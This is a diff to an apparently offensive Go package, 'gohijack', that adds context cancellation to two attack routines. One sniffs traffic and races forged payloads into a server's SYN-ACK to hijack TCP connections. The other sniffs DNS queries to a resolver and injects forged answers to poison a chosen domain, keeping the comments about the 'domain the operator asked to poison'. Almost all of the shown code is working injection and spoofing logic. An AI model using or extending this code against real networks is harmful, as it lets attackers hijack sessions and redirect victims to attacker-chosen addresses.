@@ -1,6 +1,7 @@
 package gohijack
 
 import (
+	"context"
 	"fmt"
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
@@ -31,7 +32,7 @@ func doHijack(packet gopacket.Packet, payload []byte, rawConn *ipv4.RawConn) (er
 	return
 }
 
-func Hijack(interfaceName string, srcIp string, srcPort uint32, payloadFile string, once bool) (err error) {
+func Hijack(ctx context.Context, interfaceName string, srcIp string, srcPort uint32, payloadFile string, once bool) (err error) {
 	payload, err := os.ReadFile(payloadFile)
 	if err != nil {
 		awesome_error.CheckErr(err)
@@ -56,29 +57,36 @@ func Hijack(interfaceName string, srcIp string, srcPort uint32, payloadFile stri
 	if err != nil {
 		return
 	}
-	for packet := range packets {
-		tcpLayer := packet.Layer(layers.LayerTypeTCP)
-		if tcpLayer == nil {
-			continue
-		}
-		tcp, _ := tcpLayer.(*layers.TCP)
-		if tcp == nil {
-			continue
-		}
-		// Only race the server's first segment (SYN-ACK). Injecting into later
-		// ACKs reuses a stale Seq/Ack and lands as an out-of-order segment the
-		// receiver drops; under --keep that means repeated wasted injections.
-		if !tcp.SYN || !tcp.ACK {
-			continue
-		}
-		if hijackErr := doHijack(packet, payload, rawConn); hijackErr != nil {
-			continue
-		}
-		if once {
-			return
+	for {
+		select {
+		case <-ctx.Done():
+			return ctx.Err()
+		case packet, ok := <-packets:
+			if !ok {
+				return
+			}
+			tcpLayer := packet.Layer(layers.LayerTypeTCP)
+			if tcpLayer == nil {
+				continue
+			}
+			tcp, _ := tcpLayer.(*layers.TCP)
+			if tcp == nil {
+				continue
+			}
+			// Only race the server's first segment (SYN-ACK). Injecting into later
+			// ACKs reuses a stale Seq/Ack and lands as an out-of-order segment the
+			// receiver drops; under --keep that means repeated wasted injections.
+			if !tcp.SYN || !tcp.ACK {
+				continue
+			}
+			if hijackErr := doHijack(packet, payload, rawConn); hijackErr != nil {
+				continue
+			}
+			if once {
+				return
+			}
 		}
 	}
-	return
 }
 
 // HijackDNS sniffs DNS queries addressed to (resolverIp:resolverPort) and
@@ -86,7 +94,7 @@ func Hijack(interfaceName string, srcIp string, srcPort uint32, payloadFile stri
 // are both non-empty the response is built on the fly; otherwise rawResponseFile
 // is loaded once and its transaction ID is rewritten per query. At least one of
 // the two modes must be supplied.
-func HijackDNS(interfaceName string, resolverIp string, resolverPort uint32, domain string, answerIp net.IP, rawResponseFile string, once bool) (err error) {
+func HijackDNS(ctx context.Context, interfaceName string, resolverIp string, resolverPort uint32, domain string, answerIp net.IP, rawResponseFile string, once bool) (err error) {
 	var rawResponse []byte
 	if rawResponseFile != "" {
 		rawResponse, err = os.ReadFile(rawResponseFile)
@@ -120,46 +128,53 @@ func HijackDNS(interfaceName string, resolverIp string, resolverPort uint32, dom
 	if err != nil {
 		return
 	}
-	for packet := range packets {
-		udpLayer := packet.Layer(layers.LayerTypeUDP)
-		if udpLayer == nil {
-			continue
-		}
-		dnsLayer := packet.Layer(layers.LayerTypeDNS)
-		if dnsLayer == nil {
-			continue
-		}
-		queryDNS, _ := dnsLayer.(*layers.DNS)
-		if queryDNS == nil {
-			continue
-		}
-		if queryDNS.QR {
-			continue
-		}
-		var payload []byte
-		if autoMode {
-			// Only answer queries for the domain the operator asked to poison.
-			// Without this guard we'd forge a response for every query passing
-			// through the resolver, which is rarely what's intended and makes
-			// the answer name (taken from the query) disagree with --dns-domain.
-			if len(queryDNS.Questions) == 0 || !dnsNameEqual(queryDNS.Questions[0].Name, domain) {
+	for {
+		select {
+		case <-ctx.Done():
+			return ctx.Err()
+		case packet, ok := <-packets:
+			if !ok {
+				return
+			}
+			udpLayer := packet.Layer(layers.LayerTypeUDP)
+			if udpLayer == nil {
 				continue
 			}
-			payload, err = BuildDNSResponse(queryDNS, domain, answerIp)
-			if err != nil {
+			dnsLayer := packet.Layer(layers.LayerTypeDNS)
+			if dnsLayer == nil {
 				continue
 			}
-		} else {
-			payload = RewriteTXID(rawResponse, queryDNS.ID)
-		}
-		if hijackErr := doHijackUDP(packet, payload, rawConn); hijackErr != nil {
-			continue
-		}
-		if once {
-			return
+			queryDNS, _ := dnsLayer.(*layers.DNS)
+			if queryDNS == nil {
+				continue
+			}
+			if queryDNS.QR {
+				continue
+			}
+			var payload []byte
+			if autoMode {
+				// Only answer queries for the domain the operator asked to poison.
+				// Without this guard we'd forge a response for every query passing
+				// through the resolver, which is rarely what's intended and makes
+				// the answer name (taken from the query) disagree with --dns-domain.
+				if len(queryDNS.Questions) == 0 || !dnsNameEqual(queryDNS.Questions[0].Name, domain) {
+					continue
+				}
+				payload, err = BuildDNSResponse(queryDNS, domain, answerIp)
+				if err != nil {
+					continue
+				}
+			} else {
+				payload = RewriteTXID(rawResponse, queryDNS.ID)
+			}
+			if hijackErr := doHijackUDP(packet, payload, rawConn); hijackErr != nil {
+				continue
+			}
+			if once {
+				return
+			}
 		}
 	}
-	return
 }
 
 func doHijackUDP(packet gopacket.Packet, payload []byte, rawConn *ipv4.RawConn) (err error) {
